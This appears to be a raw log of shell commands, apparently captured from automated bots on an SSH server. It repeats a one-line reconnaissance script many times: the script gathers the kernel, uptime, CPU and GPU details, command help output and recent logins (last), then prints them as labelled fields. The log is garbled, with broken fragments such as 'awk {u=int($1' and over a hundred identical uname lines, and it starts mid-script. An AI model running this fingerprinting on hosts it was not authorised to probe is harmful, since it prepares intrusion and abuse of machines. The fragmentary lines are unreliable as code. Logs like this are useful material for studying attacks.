		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
ssh -V
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
